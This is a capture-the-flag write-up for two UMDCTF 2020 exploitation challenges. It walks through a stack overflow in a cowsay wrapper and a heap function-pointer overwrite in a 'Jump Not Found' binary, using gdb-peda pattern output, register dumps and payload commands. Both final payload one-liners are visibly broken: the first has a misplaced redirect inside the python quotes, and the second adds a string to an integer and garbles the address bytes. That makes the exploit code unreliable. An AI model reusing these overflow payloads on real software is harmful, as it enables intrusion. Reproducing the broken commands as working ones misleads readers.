# UMDCTF-2020-Writeups
Write-Ups for WittsEnd2 Challenges for UMDCTF - This is a work in progress. More will come as more are written.

## Exploitation

### Cowspeak As A Service

First, let's explore `main()`. We see `char buf[1024]` and `fgets(buf, 1024, stdin)`. This means that we can put in upto 1024 bytes from stdin. 

Next lets break down  `moo()`. We see that moo takes in a parameter `*msg`, which is being put into `speak[64]` via `strcpy()`. This is also being set as the value of the environment variable `$MSG`. `system()` uses `$MSG` as a parameter for program `cowsay`.

There is also an integer called `chief_cow`, which is being set as the overwrite value of setenv. From `man setenv` overwrite does the following behavior:
 - If name does exist in the environment, then its value is changed to value if overwrite is nonzero; if overwrite is zero, then the value of name is not changed (and setenv()  returns a success status).

Based on this, we can reasonably conclude that in order to overwrite either be `0` or something other than `1`. 

Given the C file we can reasonably conclude that the layout of the stack of function `moo()` is as follows. (Note, highest address on stack starts on the top). 

 - Return Address of moo
 - EBP chief_cow - 8 byte address
 - chief_cow - int
 - EBP speak - 8 byte address
 - speak - char * 64

As a result if we modify chief_cow correctly, we will get the flag. This must be a perfect construction because if we overwrite additional bytes, it will behave normally (based on the fact it is setting an environment variable, and `strcspn(speak, '\r\n')` is looking for termination).

Given this, our payload must be 76 bytes because `64+8+4` will modify chief_cow, without affecting anything else. 

```bash
python -c "print('A' * 76) > payload.txt"
./cowspeak < payload.txt #or netcat

# UMDCTF-{flag_will_appear}
```

### Jump Not Found

We are given a binary to start. The first thing I would do given the binary is see what functions are present via gdb. We see in `info functions`.

```
0x00000000004004e0  _init
0x0000000000400510  puts@plt
0x0000000000400520  printf@plt
0x0000000000400530  strtol@plt
0x0000000000400540  gets@plt
0x0000000000400550  malloc@plt
0x0000000000400560  exit@plt
0x0000000000400570  _start
0x00000000004005a0  _dl_relocate_static_pie
0x00000000004005b0  deregister_tm_clones
0x00000000004005e0  register_tm_clones
0x0000000000400620  __do_global_dtors_aux
0x0000000000400650  frame_dummy
0x0000000000400657  jumpToHoth
0x0000000000400668  jumpToCoruscant
0x0000000000400679  jumpToEndor
0x000000000040068a  jumpToNaboo
0x000000000040069b  main
0x00000000004007f0  __libc_csu_init
0x0000000000400860  __libc_csu_fini
0x0000000000400864  _fini
```

So we see that there are four functions with `jumpTo` in the name and main. Next we checkout the program behavior. 

```
$ ./JNF
SYSTEM CONSOLE> 7
Check Systems
1 - Hoth
2 - Coruscant
3 - Endor
4 - Logout
SYSTEM CONSOLE> 1
Checking navigation...
Jumping to Hoth...
SYSTEM CONSOLE> 2
Checking navigation...
Jumping to Coruscant...
SYSTEM CONSOLE> 3
Checking navigation...
Jumping to Endor...
SYSTEM CONSOLE>
```
So we notice that we can jump to `Hoth`, `Coruscant`, and `Endor`, but naboo is missing. Lets see if there is any unexpected behvior with this. You can use a disassembler to figure out actual behavior; however, what I recommend is using `gdb-peda` or `gdb-gre` to generate a pattern and find out what is happening. 
```
gdb-peda$ pattern-create 200
Undefined command: "pattern-create".  Try "help".
gdb-peda$ pattern create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
gdb-peda$ r
Starting program: /home/mwittner/UMDCTF-2020-Challenges/Exploitation/JNF/host/JNF
SYSTEM CONSOLE> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
Check Systems
1 - Hoth
2 - Coruscant
3 - Endor
4 - Logout
SYSTEM CONSOLE> 1
Checking navigation...

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x0
RCX: 0x7fffff19ecc0 --> 0x2000200020002
RDX: 0x3541416641414a41 ('AJAAfAA5')
RSI: 0x6022d0 ("Checking navigation...\nlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
RDI: 0x1
RBP: 0x7ffffffeddf0 --> 0x4007f0 --> 0x41d7894956415741
RSP: 0x7ffffffeddd0 --> 0x602261 --> 0x4141734141254100 ('')
RIP: 0x40076a --> 0x400904bf7cebd2ff
R8 : 0x7fffff7d14c0
R9 : 0x0
R10: 0x7fffff19ecc0 --> 0x2000200020002
R11: 0x7fffff19ecc0 --> 0x2000200020002
R12: 0x400570 --> 0x89485ed18949ed31
R13: 0x7ffffffeded0 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40075e <main+195>: mov    rax,QWORD PTR [rbp-0x10]
   0x400762 <main+199>: mov    rdx,QWORD PTR [rax]
   0x400765 <main+202>: mov    eax,0x0
=> 0x40076a <main+207>: call   rdx
   0x40076c <main+209>: jmp    0x4007ea <main+335>
   0x40076e <main+211>: mov    edi,0x400904
   0x400773 <main+216>: call   0x400510 <puts@plt>
   0x400778 <main+221>: mov    rax,QWORD PTR [rbp-0x10]
No argument
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeddd0 --> 0x602261 --> 0x4141734141254100 ('')
0008| 0x7ffffffeddd8 --> 0x602260 --> 0x4173414125410031 ('1')
0016| 0x7ffffffedde0 --> 0x6022b0 ("AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiChecking navigation...\nlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0024| 0x7ffffffedde8 --> 0x6e670c801dc57d00
0032| 0x7ffffffeddf0 --> 0x4007f0 --> 0x41d7894956415741
0040| 0x7ffffffeddf8 --> 0x7fffff021b97 (<__libc_start_main+231>:       mov    edi,eax)
0048| 0x7ffffffede00 --> 0x1
0056| 0x7ffffffede08 --> 0x7ffffffeded8 --> 0x7ffffffee12f ("/home/mwittner/UMDCTF-2020-Challenges/Exploitation/JNF/host/JNF")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x000000000040076a in main ()
```
We see that it segmentation faults when jumping to Hoth, and we notice something interesting happening to the registers: 
```
RDX: 0x3541416641414a41 ('AJAAfAA5')
RSI: 0x6022d0 ("Checking navigation...\nlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
```
This looks similar to our pattern we just created, so lets see what happens when we try to find `AJAAfAA5`.

```
gdb-peda$ pattern offset AJAAfAA5
AJAAfAA5 found at offset: 80
gdb-peda$   
```
It looks like that it is found at offset 80. Therefore our payload must be 80 bytes to reach it. Now if you haven't started disassembling already, you should do that. You should also have figured out that this is not a stack based exploit because the system is calling function pointers through the struct `jmptable`. `jmptable` is initialized through malloc; thus, it is a heap based exploit. As a result, we should place the address immediately after our payload. 

Our construction of the payload is as follows: `payload + address`. There is two caveats to this: if you do not tell the system to jump to Hoth immediately after, you will run into an infinite loop. In addition, can't start at the prolog. the first byte of jumpToNaboo(that isn't 0x00) is 0x0a, which is `\n` in ascii. Running this command in GDB `b jumpToNaboo` will give you a good place to start. 

Final steps: 
```bash
python -c "print('A'+80+'\x40\06\8e\n\1\n')" > payload 
./JNF < payload
# UMDCTF-{flag_appears_here} 
```

